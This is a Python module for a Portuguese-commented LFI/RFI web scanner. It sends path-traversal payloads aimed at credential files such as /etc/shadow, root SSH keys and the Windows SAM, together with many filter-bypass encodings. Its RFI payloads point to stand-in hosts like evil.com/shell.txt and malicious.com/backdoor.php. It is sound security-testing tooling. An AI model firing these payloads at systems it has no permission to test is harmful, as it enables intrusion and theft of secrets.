# -*- coding: utf-8 -*-
"""
LFI (Local File Inclusion) Scanner Module
Módulo para detecção de vulnerabilidades de Local File Inclusion e Remote File Inclusion.
"""

import requests
import re
import time
import json
from datetime import datetime
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
from concurrent.futures import ThreadPoolExecutor, as_completed

from ..core.logger import get_logger
from ..utils.network import create_session


class LFIScanner:
    """Scanner para detecção de vulnerabilidades de Local File Inclusion (LFI) e Remote File Inclusion (RFI)."""

    def __init__(self, base_url, timeout=10, threads=5):
        self.base_url = base_url
        self.timeout = timeout
        self.threads = threads
        self.verbose = False
        self.fast_mode = False
        self.found_vulnerabilities = []
        self.stop_on_first = False
        self.traversal_depth = 10
        self.encoding_techniques = 13
        
        # Session pool para melhor performance
        self.session_pool = []
        pool_size = min(threads, 10)
        for _ in range(pool_size):
            session = create_session()
            self.session_pool.append(session)
            
        self.current_session_index = 0
        self.vulnerable_points = []
        
        # RFI payloads para teste
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/test",
            "ftp://malicious.com/backdoor.php"
        ]
        
        # Dicionário de arquivos alvo e suas assinaturas
        self.payloads = {
            # Linux/Unix files
            "/etc/passwd": ["root:x:0:0", "daemon:x:1:1", "bin:x:2:2"],
            "/etc/shadow": ["root:$", "daemon:*:", "bin:*:"],
            "/etc/hosts": ["127.0.0.1", "localhost"],
            "/etc/group": ["root:x:0:", "daemon:x:1:"],
            "/etc/issue": ["Ubuntu", "Debian", "CentOS", "Red Hat"],
            "/etc/motd": ["Welcome", "Last login"],
            "/etc/fstab": ["proc", "sysfs", "devpts"],
            "/etc/crontab": ["SHELL=/bin/bash", "PATH=/usr/local/sbin"],
            "/proc/version": ["Linux version", "gcc version"],
            "/proc/cpuinfo": ["processor", "model name"],
            "/proc/meminfo": ["MemTotal", "MemFree"],
            "/proc/self/environ": ["PATH=", "HOME="],
            "/home/user/.bashrc": ["alias", "export"],
            "/root/.bashrc": ["alias", "export"],
            "/root/.ssh/id_rsa": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
            
            # Windows files
            "c:\\boot.ini": ["[boot loader]", "timeout=", "default="],
            "c:\\windows\\system32\\drivers\\etc\\hosts": ["127.0.0.1", "localhost"],
            "c:\\windows\\system32\\config\\sam": ["SAM", "SECURITY"],
            "c:\\windows\\system32\\config\\system": ["SYSTEM", "ControlSet"],
            "c:\\windows\\win.ini": ["[fonts]", "[extensions]"],
            "c:\\windows\\system.ini": ["[386Enh]", "[drivers]"],
            "c:\\inetpub\\wwwroot\\web.config": ["<configuration>", "<system.web>"],
            "c:\\php\\php.ini": ["[PHP]", "extension_dir"],
            "c:\\windows\\php.ini": ["[PHP]", "extension_dir"],
            
            # Mac OS files
            "/etc/master.passwd": ["root:", "daemon:"],
            "/private/etc/passwd": ["root:*:0:0", "daemon:*:1:1"],
            "/users/administrator/.bash_history": ["sudo", "ssh", "mysql"],
            "/library/preferences/": ["plist", "preferences"],
            "/private/etc/apache2/httpd.conf": ["ServerRoot", "Listen"],
        }
        
        self.logger = get_logger(__name__)
        self.console = Console()

    def _get_session(self):
        """Obtém uma sessão do pool de forma round-robin"""
        session = self.session_pool[self.current_session_index]
        self.current_session_index = (self.current_session_index + 1) % len(self.session_pool)
        return session

    def _apply_encoding_techniques(self, payload):
        """Aplica diferentes técnicas de codificação para bypass de filtros"""
        if self.fast_mode:
            # Modo rápido: apenas as técnicas mais eficazes
            techniques = [
                payload,  # Original
                payload.replace('/', '%2f'),  # URL encoding
                payload.replace('/', '%252f'),  # Double URL encoding
                payload.replace('../', '..\\\\'),  # Windows path separator
                payload + '%00',  # Null byte termination
                payload.replace('../', '..%2f'),  # Mixed encoding
                payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
                payload.replace('../', '....//'),  # Double dot slash
            ]
        else:
            # Modo completo: todas as técnicas
            techniques = [
                payload,  # Original
                payload.replace('/', '%2f'),  # URL encoding
                payload.replace('/', '%252f'),  # Double URL encoding
                payload.replace('/', '%c0%af'),  # UTF-8 encoding
                payload + '%00',  # Null byte termination
                payload.replace('../', '..\\\\'),  # Windows path separator
                payload.replace('../', '....//'),  # Double dot slash
                payload.replace('../', '..%2f'),  # Mixed encoding
                payload.replace('../', '..%252f'),  # Double encoded slash
                payload.replace('../', '..%c0%af'),  # UTF-8 encoded slash
                payload.replace('../', '..%5c'),  # Backslash encoding
                payload.replace('/', '\\\\'),  # Full backslash
                payload + '?',  # Query string bypass
                payload + '#',  # Fragment bypass
                payload.replace('../', '..;/'),  # Semicolon bypass
                payload.replace('../', '..%00/'),  # Null byte bypass
                payload.replace('../', '..%2e%2e%2f'),  # Full dot encoding
                payload.replace('../', '%2e%2e%2f'),  # Dot encoding
                payload + '\\\\x00',  # Null byte (hex)
                payload.replace('/', '%2F'),  # Capital URL encoding
                payload.replace('../', '..%c0%2f'),  # Overlong UTF-8
            ]
        
        # Remove duplicatas mantendo ordem
        seen = set()
        unique_techniques = []
        for tech in techniques:
            if tech not in seen:
                seen.add(tech)
                unique_techniques.append(tech)
        
        # Limitar número de técnicas se especificado
        if self.encoding_techniques and len(unique_techniques) > self.encoding_techniques:
            unique_techniques = unique_techniques[:self.encoding_techniques]
        
        return unique_techniques

    def _test_payload(self, args):
        """Testa um payload específico (para uso com ThreadPoolExecutor)"""
        url, method, param, form_data, payload, path, signatures, session = args
        
        try:
            start_time = time.time()
            
            test_data = {param: payload}
            if method.lower() == 'get':
                response = session.get(url, params=test_data, timeout=self.timeout, verify=False)
            else:
                post_payload = form_data.copy() if form_data else {}
                post_payload[param] = payload
                response = session.post(url, data=post_payload, timeout=self.timeout, verify=False)
            
            response_time = time.time() - start_time
            
            # Detecção por assinatura
            for signature in signatures:
                if signature.lower() in response.text.lower():
                    # Capturar evidência específica da resposta
                    evidence_start = response.text.lower().find(signature.lower())
                    evidence_excerpt = response.text[max(0, evidence_start-50):evidence_start+100]
                    
                    finding = {
                        "Risco": "Alto",
                        "Tipo": "Local File Inclusion (LFI)",
                        "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                        "Recomendação": f"Payload '{payload}' retornou conteúdo do arquivo '{path}'.",
                        "Payload": payload,
                        "File_Path": path,
                        "Signature": signature,
                        "Response_Time": round(response_time, 3),
                        "Response_Length": len(response.text),
                        "Status_Code": response.status_code,
                        "Encoding_Technique": self._get_encoding_technique(payload, f"../{path}"),
                        "Evidence": evidence_excerpt.strip(),
                        "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
                        "Method": method.upper(),
                        "Content_Type": response.headers.get('content-type', 'N/A'),
                        "Server_Header": response.headers.get('server', 'N/A'),
                        "Response_Size": len(response.content),
                        "Confidence": "High"
                    }
                    return finding
            
            # Detecção por timing
            if response_time > 2.0 and response.status_code == 200:
                timing_finding = {
                    "Risco": "Médio",
                    "Tipo": "Possível LFI (Timing-based)",
                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                    "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
                    "Payload": payload,
                    "File_Path": path,
                    "Response_Time": round(response_time, 3),
                    "Response_Length": len(response.text),
                    "Status_Code": response.status_code,
                    "Detection_Method": "Timing-based",
                    "Evidence": f"Delay anômalo de {response_time:.2f}s detectado",
                    "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
                    "Method": method.upper(),
                    "Content_Type": response.headers.get('content-type', 'N/A'),
                    "Server_Header": response.headers.get('server', 'N/A'),
                    "Response_Size": len(response.content),
                    "Confidence": "Medium"
                }
                return timing_finding
                
        except requests.RequestException:
            pass
        
        return None

    def _test_rfi(self, url, method, param, form_data=None):
        """Testa Remote File Inclusion (RFI)"""
        if self.verbose:
            self.console.print(f"[*] Testando RFI no parâmetro [cyan]{param}[/cyan]...")
            
        session = self._get_session()
        
        for rfi_payload in self.rfi_payloads:
            try:
                test_data = {param: rfi_payload}
                if method.lower() == 'get':
                    response = session.get(url, params=test_data, timeout=self.timeout, verify=False)
                else:
                    post_payload = form_data.copy() if form_data else {}
                    post_payload[param] = rfi_payload
                    response = session.post(url, data=post_payload, timeout=self.timeout, verify=False)
                
                # Detecção de RFI através de códigos de status
                if response.status_code == 200 and len(response.text) > 100:
                    # Procura por indicadores de execução remota
                    rfi_indicators = [
                        "<?php", "<script>", "eval(", "system(", "exec(", "shell_exec(",
                        "passthru(", "file_get_contents(", "fopen(", "include(", "require(",
                        "remote shell", "backdoor", "webshell", "r57", "c99", "c100"
                    ]
                    
                    for indicator in rfi_indicators:
                        if indicator.lower() in response.text.lower():
                            finding = {
                                "Risco": "Crítico",
                                "Tipo": "Remote File Inclusion (RFI)",
                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                                "Recomendação": f"Payload '{rfi_payload}' pode permitir execução de código remoto.",
                                "Payload": rfi_payload,
                                "Response_Length": len(response.text),
                                "Status_Code": response.status_code,
                                "Indicator": indicator,
                                "Confidence": "High"
                            }
                            if finding not in self.vulnerable_points:
                                self.vulnerable_points.append(finding)
                            return True
                            
            except requests.RequestException:
                continue
        return False

    def _scan_target(self, url, method, param, form_data=None):
        """Escaneia um alvo específico para vulnerabilidades LFI/RFI"""
        if self.verbose:
            self.console.print(f"[*] Analisando parâmetro [cyan]{param}[/cyan] via [yellow]{method.upper()}[/yellow]")
            
        # Primeiro testa RFI
        if self._test_rfi(url, method, param, form_data):
            return
            
        # Depois testa LFI
        if self.verbose:
            self.console.print(f"[*] Testando LFI no parâmetro [cyan]{param}[/cyan] ({len(self.payloads)} arquivos alvo)...")
            
        # Preparar tasks para ThreadPoolExecutor
        tasks = []
        session_index = 0
        
        for path, signatures in self.payloads.items():
            levels_to_test = 5 if self.fast_mode else self.traversal_depth
            
            for i in range(levels_to_test):
                base_payload = "../" * i + path
                encoded_payloads = self._apply_encoding_techniques(base_payload)
                
                for payload in encoded_payloads:
                    # Atribuir sessão de forma round-robin
                    session = self.session_pool[session_index % len(self.session_pool)]
                    session_index += 1
                    
                    task_args = (url, method, param, form_data, payload, path, signatures, session)
                    tasks.append(task_args)
                    
                    # Limitar número de tasks para evitar sobrecarga no modo rápido
                    if len(tasks) >= 500 and self.fast_mode:
                        break
                        
                if len(tasks) >= 500 and self.fast_mode:
                    break
                    
            if len(tasks) >= 500 and self.fast_mode:
                break
        
        # Executar tasks em paralelo
        vulnerabilities_found = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submeter todas as tasks
            future_to_task = {executor.submit(self._test_payload, task): task for task in tasks}
            
            # Processar resultados conforme ficam prontos
            for future in as_completed(future_to_task):
                try:
                    result = future.result()
                    if result:
                        vulnerabilities_found.append(result)
                        
                        # Se encontrou vulnerabilidade crítica ou alta, pode parar
                        if self.stop_on_first and result['Risco'] in ['Crítico', 'Alto']:
                            # Cancelar tasks pendentes
                            for f in future_to_task:
                                f.cancel()
                            break
                            
                except Exception:
                    continue
        
        # Adicionar vulnerabilidades encontradas
        for vuln in vulnerabilities_found:
            if vuln not in self.vulnerable_points:
                self.vulnerable_points.append(vuln)

    def _get_encoding_technique(self, encoded_payload, original_payload):
        """Identifica a técnica de codificação usada"""
        if encoded_payload == original_payload:
            return "Original"
        elif '%2f' in encoded_payload.lower():
            return "URL Encoding"
        elif '%252f' in encoded_payload.lower():
            return "Double URL Encoding"
        elif '%c0%af' in encoded_payload.lower():
            return "UTF-8 Overlong Encoding"
        elif '%00' in encoded_payload:
            return "Null Byte Termination"
        elif '\\\\' in encoded_payload:
            return "Windows Path Separator"
        elif '....///' in encoded_payload:
            return "Double Dot Slash"
        else:
            return "Mixed Encoding"

    def run_scan(self, return_findings=False):
        """Executa o scan principal de LFI/RFI"""
        if not return_findings:
            self.console.print("-" * 80)
            self.console.print(f"[*] Executando scanner de LFI/RFI em: [bold cyan]{self.base_url}[/bold cyan]")
            self.console.print(f"[*] Timeout: {self.timeout}s | Threads: {self.threads} | Payloads: {len(self.payloads)}")
            self.console.print("-" * 80)
        
        start_time = time.time()
        
        try:
            with self.console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self._get_session().get(self.base_url, timeout=self.timeout, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
                
        except requests.RequestException as e:
            if not return_findings: 
                self.console.print(f"[bold red][!] Não foi possível acessar a página inicial: {e}[/bold red]")
            return [] if return_findings else None

        # Parâmetros comuns para teste
        common_params = [
            'file', 'page', 'include', 'path', 'document', 'img', 'view', 'load', 'read',
            'template', 'src', 'url', 'dir', 'folder', 'content', 'data', 'resource',
            'filename', 'filepath', 'pathname', 'location', 'link', 'href', 'target',
            'source', 'destination', 'upload', 'download', 'action', 'module'
        ]
        
        tasks = []
        
        # Coleta links com parâmetros GET
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
            
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): 
                    tasks.append(('get', base, param, None))

        # Coleta formulários
        forms = soup.find_all('form')
            
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): 
                    tasks.append((method, action, param, data))
        
        # Testa parâmetros comuns mesmo se não encontrados na página
        if not tasks:
            if not return_findings: 
                self.console.print("[yellow]Nenhum parâmetro encontrado na página. Testando parâmetros comuns...[/yellow]")
                
            for param in ['file', 'page', 'include', 'path', 'view', 'load', 'src', 'url']:
                tasks.append(('get', self.base_url, param, None))
        
        if not tasks:
            if not return_findings: 
                self.console.print("[yellow]Nenhum parâmetro para testar.[/yellow]")
            return [] if return_findings else None

        # Executa os testes
        with Progress(
            SpinnerColumn(), 
            TextColumn("[progress.description]{task.description}"), 
            BarColumn(), 
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
            TimeRemainingColumn(),
            console=self.console, 
            transient=return_findings
        ) as progress:
            task_id = progress.add_task("[green]Testando LFI/RFI...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        scan_time = time.time() - start_time
        
        if not return_findings:
            self.console.print(f"\n[bold blue][*] Scan concluído em {scan_time:.2f} segundos[/bold blue]")
            self.console.print(f"[bold blue][*] Parâmetros testados: {len(tasks)}[/bold blue]")
            self.console.print(f"[bold blue][*] Vulnerabilidades encontradas: {len(self.vulnerable_points)}[/bold blue]")
            
        if return_findings: 
            return self.vulnerable_points
        
        self._present_findings()
        return self.vulnerable_points

    def _present_findings(self):
        """Apresenta os resultados encontrados"""
        self.console.print("-" * 80)
        if not self.vulnerable_points:
            self.console.print("[bold green][+] Nenhuma vulnerabilidade de LFI/RFI foi encontrada.[/bold green]")
        else:
            # Separar por tipo de vulnerabilidade
            lfi_findings = [f for f in self.vulnerable_points if 'LFI' in f['Tipo']]
            rfi_findings = [f for f in self.vulnerable_points if 'RFI' in f['Tipo']]
            
            # Resumo executivo
            critical_count = len([f for f in self.vulnerable_points if f['Risco'] == 'Crítico'])
            high_count = len([f for f in self.vulnerable_points if f['Risco'] == 'Alto'])
            
            if critical_count > 0:
                self.console.print(f"[bold red]⚠️ ALERTA: {critical_count} vulnerabilidade(s) CRÍTICA(S) encontrada(s)![/bold red]")
            if high_count > 0:
                self.console.print(f"[bold orange1]⚠️ ATENÇÃO: {high_count} vulnerabilidade(s) de ALTO RISCO encontrada(s)![/bold orange1]")
            
            self.console.print()
            
            # Tabela principal de vulnerabilidades
            table = Table(title="[bold red]Vulnerabilidades de LFI/RFI Detectadas[/bold red]")
            table.add_column("Tipo", style="red", width=12)
            table.add_column("Risco", style="red", width=8)
            table.add_column("Parâmetro", style="cyan", width=15)
            table.add_column("Técnica", style="yellow", width=15)
            table.add_column("Arquivo", style="green", width=20)
            table.add_column("Status", style="blue", width=8)
            
            for f in self.vulnerable_points:
                payload = f.get('Payload', 'N/A')
                bypass_technique = self._get_encoding_technique(payload, '')
                file_path = f.get('File_Path', 'N/A')
                if len(file_path) > 18:
                    file_path = file_path[:15] + "..."
                
                table.add_row(
                    f['Tipo'],
                    f['Risco'],
                    f['Detalhe'].split("'")[1] if "'" in f['Detalhe'] else 'N/A',
                    bypass_technique,
                    file_path,
                    str(f.get('Status_Code', 'N/A'))
                )
            
            self.console.print(table)
            self.console.print()
            
            # Estatísticas
            stats_table = Table(title="[bold blue]📊 Estatísticas do Scan[/bold blue]")
            stats_table.add_column("Categoria", style="blue", width=20)
            stats_table.add_column("Quantidade", style="white", width=10)
            
            total_vulns = len(self.vulnerable_points)
            stats_table.add_row("Total de Vulnerabilidades", str(total_vulns))
            stats_table.add_row("LFI Confirmadas", str(len(lfi_findings)))
            stats_table.add_row("RFI Confirmadas", str(len(rfi_findings)))
            stats_table.add_row("Crítico", str(critical_count))
            stats_table.add_row("Alto", str(high_count))
            stats_table.add_row("Médio", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Médio'])))
            stats_table.add_row("Baixo", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Baixo'])))
            
            self.console.print(stats_table)
            
            # Recomendações
            self.console.print("\n[bold blue]Recomendações para Correção:[/bold blue]")
            if critical_count > 0 or high_count > 0:
                self.console.print("[bold red]AÇÃO IMEDIATA NECESSÁRIA:[/bold red]")
                self.console.print("   1. Implementar validação rigorosa de entrada nos parâmetros afetados")
                self.console.print("   2. Desabilitar allow_url_include e allow_url_fopen no PHP")
                self.console.print("   3. Implementar whitelist de arquivos permitidos")
                self.console.print("   4. Configurar chroot/jail para isolamento do servidor web")
                self.console.print()
            
            self.console.print("[bold yellow]MELHORIAS DE SEGURANÇA:[/bold yellow]")
            self.console.print("   • Implementar path canonicalization")
            self.console.print("   • Configurar Content Security Policy (CSP)")
            self.console.print("   • Implementar rate limiting para requisições suspeitas")
            self.console.print("   • Monitorar logs de acesso para padrões de path traversal")
            self.console.print("   • Implementar Web Application Firewall (WAF)")
            
        self.console.print("-" * 80)


def lfi_scan(url, timeout=10, threads=5, verbose=False, fast_mode=False, stop_on_first=False):
    """
    Executa scan de LFI/RFI em uma URL.
    
    Args:
        url (str): URL alvo para o scan
        timeout (int): Timeout das requisições
        threads (int): Número de threads para execução
        verbose (bool): Saída detalhada
        fast_mode (bool): Modo rápido (menos técnicas)
        stop_on_first (bool): Para na primeira vulnerabilidade encontrada
    
    Returns:
        list: Lista de vulnerabilidades encontradas
    """
    scanner = LFIScanner(url, timeout=timeout, threads=threads)
    scanner.verbose = verbose
    scanner.fast_mode = fast_mode
    scanner.stop_on_first = stop_on_first
    return scanner.run_scan()
